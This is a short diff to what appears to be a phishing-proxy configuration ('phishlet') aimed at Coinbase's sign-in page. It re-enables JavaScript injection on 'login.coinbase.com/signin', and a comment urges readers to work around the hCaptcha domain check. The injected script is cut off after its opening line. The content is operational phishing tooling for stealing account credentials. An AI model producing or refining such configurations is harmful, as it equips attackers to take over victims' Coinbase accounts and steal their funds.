@@ -117,9 +117,9 @@ js_inject:
 
 
 # HCAPTCHA Header That shows domain name can be Replaced dynamically with javascripts, Its Disabled Here Because Its resulting in Hcaptcha error, Find your ways to solve it.
-
+js_inject:
  - trigger_domains: ["login.coinbase.com"]
-   trigger_paths: ["/signin?"]
+   trigger_paths: ["/signin"]
    trigger_params: []
    script: |
      function hcaptcha(){
